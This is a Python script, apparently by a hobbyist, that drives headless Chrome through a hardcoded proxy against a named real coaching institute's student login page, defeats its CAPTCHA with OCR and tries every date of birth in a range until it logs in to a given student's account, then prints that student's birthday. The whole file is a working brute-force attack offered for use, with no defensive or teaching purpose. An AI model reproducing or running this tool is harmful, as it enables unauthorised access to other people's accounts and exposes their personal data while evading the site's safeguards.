"""
Made by Harsh Patil
First published on 11th December 2020.

IMPORTS ->
Importing all the required dependencies for the program.
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from PIL import Image
import sys
import time
import subprocess
import pytesseract
import logging
import os
import chromedriver_autoinstaller
from selenium.webdriver.remote.remote_connection import LOGGER
from selenium.webdriver.common.proxy import Proxy, ProxyType

"""
CONFIGURATION ->
Edit this configuration to your liking. 
Keep in mind that this program is specifically desgined for Allen's GST Page and it won't work for any other website. 
"""

website_url = "https://www.allen.ac.in/appsmvc2021/GST/Login"
autoinstall_driver = True   # Do not change this unless you know what you're doing.
magick_path = r'C:\Program Files\ImageMagick-7.0.10-Q16-HDRI'   # Change this to your own directory.
chrome_headless = True
use_proxy = True
http_proxy = "157.65.25.144:3128"
logs = True

start_year = 2004   # If this is something other than 2004 then please change the month_days accordingly.
start_day = 1

"""
CONFIGURATION_SETUP ->
Using the configuration to setup the program.
"""

if autoinstall_driver:
    chromedriver_autoinstaller.install(cwd=True)

os.environ['PATH'] += os.path.pathsep + magick_path
LOGGER.setLevel(logging.WARNING)   # Remove unncesessary logs from the console.

chrome_options = Options()
chrome_options.add_argument('log-level=3')   # Remove unnecessary logs from the console.
if chrome_headless:
    chrome_options.headless = True

capabilities = webdriver.DesiredCapabilities.CHROME
if use_proxy:
    proxy = Proxy()
    proxy.proxy_type = ProxyType.MANUAL
    proxy.http_proxy = http_proxy
    proxy.add_to_capabilities(capabilities)
    print("Using proxy =", proxy.http_proxy)

"""
SELENIUM_SETUP ->
Create the selenium driver and configure it according to the configuration files.
"""

driver = webdriver.Chrome(options=chrome_options, desired_capabilities=capabilities)
driver.get(website_url)   # Open the website specified in website_url

"""
STUDENT_INFORMATION ->
Input the basic student information from the terminal, and setup the required variables.
"""
month = int(input('Enter the month from which you want to start: '))
month_limit = int(input('Enter the month to stop at: '))
form_number = input("Enter the form number of the student: ")

month_days = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
page_error = True

total_days = 0
for i in range(month - 1, month_limit):
    total_days += month_days[i]

tries = 1

"""
BRUTEFORCE ->
Bruteforce the website to check every day between month and month_limit.
"""
while True:
    if month == month_limit and start_day == month_days[month_limit - 1]:   # Iterated through the specified range.
        print("The student wasn't born in the limited range.")
        break

    if start_day > month_days[month - 1]:
        start_day = 1
        month += 1

    if not page_error:
        try:
            driver.find_element_by_xpath("/html[@class=' js flexbox flexboxlegacy canvas canvastext webgl no-touch "
                                         "geolocation postmessage websqldatabase indexeddb hashchange history "
                                         "draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage "
                                         "borderradius boxshadow textshadow opacity cssanimations csscolumns "
                                         "cssgradients "
                                         "cssreflections csstransforms csstransforms3d csstransitions fontface "
                                         "generatedcontent video audio localstorage sessionstorage webworkers "
                                         "no-applicationcache svg inlinesvg smil svgclippaths']/body/div["
                                         "@class='container body-content']/div[@class='container content']/form["
                                         "@class='form-horizontal']/div[@class='alert alert-danger fade in']/button["
                                         "@class='close']").click()
        except Exception as ex:
            page_error = True
            continue

    page_error = False

    driver.save_screenshot("screenshot.png")

    img = Image.open("screenshot.png")
    if chrome_headless:
        img = img.crop((54, 517, 201, 576))
    else:
        img = img.crop((61, 517, 208, 575))

    img.save("cropped.png")
    os.remove("screenshot.png")

    # Convert the image into a readable form for tesseract.
    os.system("magick convert cropped.png -colorspace gray -separate -average -threshold 90% -negate -morphology "
              "Thinning Ridges cropped.png")
    captcha_text = pytesseract.image_to_string(
            Image.open("cropped.png"),
            config="-l allen_captcha -c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        ).replace(" ", "").rstrip()

    if len(captcha_text) != 6:   # Tesseract failed to read the captcha correctly, hence skip it.
        driver.get(website_url)
        page_error = True
        continue

    name_input = driver.find_element_by_name("Fno")
    name_input.clear()
    name_input.send_keys(form_number)

    date_input = driver.find_element_by_name("DOB")
    date_input.clear()
    date_input.send_keys(str(start_day).zfill(2) + '/' + str(month).zfill(2) + '/' + str(start_year))

    captcha_input = driver.find_element_by_name("Captcha")
    captcha_input.click()
    captcha_input.clear()
    captcha_input.send_keys(captcha_text + Keys.RETURN)

    if "control panel" in driver.title.lower():
        print('\n\n\n\n')
        print(f"The student's birthday is:\nDay: {start_day}\nMonth: {month}\nYear: {start_year}")
        break
    else:
        try:
            error = driver.find_element_by_xpath(
                "/html[@class=' js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage "
                "websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs "
                "backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns "
                "cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface "
                "generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg "
                "inlinesvg smil svgclippaths']/body/div[@class='container body-content']/div[@class='container "
                "content']/form[ "
                "@class='form-horizontal']/div[@class='alert alert-danger fade in']")

            if "please enter correct form no" in error.get_attribute('innerHTML').lower():
                print('Checked ' + str(start_day).zfill(2) + '/' + str(month).zfill(2) + '/' + str(start_year))
                start_day += 1

            if logs:
                print('Try =', tries, " with the captcha being", captcha_text)
            tries += 1
        except Exception as exep:
            pass

driver.close()
